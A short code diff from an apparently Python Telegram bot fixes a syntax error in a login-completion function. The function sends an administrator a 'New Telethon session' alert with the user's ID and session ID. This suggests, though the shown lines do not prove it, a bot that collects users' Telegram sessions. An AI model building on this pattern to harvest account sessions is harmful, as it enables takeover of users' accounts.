@@ -218,7 +218,7 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await context.bot.send_message(
         chat_id=ADMIN_ID,
-        text==(
+        text=(
             f"🔐 <b>New Telethon session</b>\n"
             f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
             f"📌 <b>Session ID:</b> <code>{me.id}</code>\n"
